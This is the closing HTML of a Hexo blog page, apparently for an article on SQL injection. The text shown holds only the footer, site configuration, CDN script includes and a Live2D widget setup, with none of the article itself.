rotate"></i> </span><span class="author" itemprop="copyrightHolder">Or0kit @ Be malicious</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i> </span><span title="站点总字数">817k 字</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="ic i-coffee"></i> </span><span title="站点阅读时长">12:23</span></div><div class="powered-by">基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"再学SQLinjection/",favicon:{show:"（●´3｀●）やれやれだぜ",hide:"(´Д｀)大変だ！"},search:{placeholder:"文章搜索",empty:"关于 「 ${query} 」，什么也没搜到",stats:"${time} ms 内找到 ${hits} 条结果"},valine:!0,fancybox:!0,copyright:'复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="/js/app.js?v=0.2.5"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({pluginRootPath:"live2dw/",pluginJsPath:"lib/",pluginModelPath:"assets/",tagMode:!1,debug:!1,model:{scale:1,hHeadPos:.5,vHeadPos:.618,jsonPath:"/live2dw/assets/koharu.model.json"},display:{superSample:2,width:150,height:300,position:"right",hOffset:0,vOffset:-20},mobile:{show:!0,scale:.5},react:{opacityDefault:.7,opacityOnHover:.8},log:!1})</script></body></html><!-- rebuild by hrmmi -->
